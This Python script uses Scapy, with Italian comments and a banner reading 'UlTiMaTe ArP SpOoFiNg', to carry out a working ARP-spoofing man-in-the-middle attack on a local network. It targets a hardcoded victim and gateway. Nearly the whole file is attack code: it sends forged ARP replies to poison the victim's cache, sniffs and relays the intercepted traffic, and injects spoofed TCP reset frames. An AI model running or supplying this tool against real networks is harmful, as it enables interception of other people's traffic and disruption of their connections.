from scapy.all import *
from scapy.layers.inet import Ether, IP, TCP
import time
import threading

gateway_mac='52:54:00:88:15:b6'
victim_mac='00:e0:4c:36:73:52'
my_mac='08:00:27:24:32:1f'
broadcast_mac='ff:ff:ff:ff:ff:ff'
my_ip='192.168.20.101'
gateway_ip='192.168.20.1'
victim_ip='192.168.20.47'

number_gateway=1
number_victim=1
svuotato=True
old_pckt = []
pckt_buffer_gateway=[]
pckt_buffer_victim=[]
semaforo=threading.Semaphore(1)
semaforo_2=threading.Semaphore(1)
def buffered_sniff(pckt):
	global old_pckt
	global pckt_buffer_gateway
	global pckt_buffer_victim
	global svuotato
	global t
	global invia_a_gatewayy
	
	if ARP in pckt:
		#print("ARP droppato")	
		return
	elif IP in pckt and pckt[IP].chksum in old_pckt:
	#	#print("uguale")
		return
	#elif TCP in pckt and pckt[TCP].chksum in old_pckt:
		#print("uguale TCP")
	#	return
	if (pckt[Ether].dst==my_mac and pckt[Ether].src==victim_mac):
		#semaforo.acquire()	
		if invia_a_gatewayy.isAlive():
			invia_a_gatewayy.do_run=False
			invia_a_gatewayy.join()
		pckt[Ether].dst = gateway_mac
		pckt_buffer_victim.append(pckt)

		#semaforo.release()
		
		invia_a_gatewayy= threading.Thread(target=invia_a_gateway)

		invia_a_gatewayy.start()
			
	elif (pckt[Ether].dst==victim_mac and pckt[Ether].src==gateway_mac):
		if len(pckt_buffer_gateway)<number_gateway:
			pckt[Ether].src = my_mac
			pckt_buffer_gateway.append(pckt)
		else:
			#semaforo_2.acquire()
			if t.isAlive():
				t.do_run=False
				t.join()
			#semaforo_2.release()
			chi_e_h()
			for i in range(number_gateway):
				sendp(pckt_buffer_gateway[i],verbose=0)
				print("inviata replica a vittima  %d",i)
			#semaforo_2.acquire()
			if t.isAlive()==False:
				t = threading.Thread(target=sono_h)
				t.start()
			#semaforo_2.release()
			
			pckt_buffer_gateway*=0

	if len(old_pckt)>=20:
		old_pckt*=0
	if IP in pckt:
		old_pckt.append(pckt[IP].chksum)
	if TCP in pckt:
		old_pckt.append(pckt[TCP].chksum)

def invia_a_gateway():
	global old_pckt
	global pckt_buffer_gateway
	global pckt_buffer_victim
	global svuotato
	global t
	global invia_a_gateway
	
	time_wait=0.1
	tempo=time.time()
	while tempo-time.time()<time_wait and getattr(invia_a_gatewayy, "do_run", True):
		pass
	if getattr(invia_a_gatewayy, "do_run", False):
		print("Esco")
		return
	#semaforo_2.acquire()
	if t.isAlive():
		t.do_run=False
		t.join()
	
	#semaforo_2.release()
	#semaforo.acquire()
	for i in range(len(pckt_buffer_victim)):
		sendp(pckt_buffer_victim[i],verbose=0)
		chi_e_h()
		print("inviata replica a gateway %d",i)
	pckt_buffer_victim*=0
	semaforo.release()
	#semaforo_2.acquire()
	if t.isAlive()==False:
		t = threading.Thread(target=sono_h)
		t.start()
	#semaforo_2.release()
	#print("Esco")


def sono_h():
	#print("entro")
	t = threading.currentThread()
	while getattr(t, "do_run", True):
		#print("arpizzo h")
		sendp(Ether(dst=gateway_mac,src=victim_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]),verbose=0 )
		time.sleep(0.1)
	#print("stopped")

def chi_e_h():
	#print("chi e' h")
	sendp(Ether(dst=broadcast_mac,src=my_mac)/ARP(op=1,psrc=my_ip,pdst=victim_ip),verbose=0)

def arp_spoof():
	print("Arp spoofing unidirezionale avviato")
	while 1:
		sendp(Ether(dst=broadcast_mac,src=my_mac)/ARP(op=2,psrc=gateway_ip,pdst=victim_ip, hwdst=broadcast_mac),verbose=0)
		time.sleep(1)

print("UlTiMaTe ArP SpOoFiNg\n")
arp_spoof = threading.Thread(target=arp_spoof)
t = threading.Thread(target=sono_h)
invia_a_gatewayy= threading.Thread(target=invia_a_gateway)
t.start()
arp_spoof.start()

sniff(lfilter=lambda d: (d.dst==my_mac and d.src==victim_mac) or (d.dst==victim_mac and d.src==gateway_mac), prn=buffered_sniff)






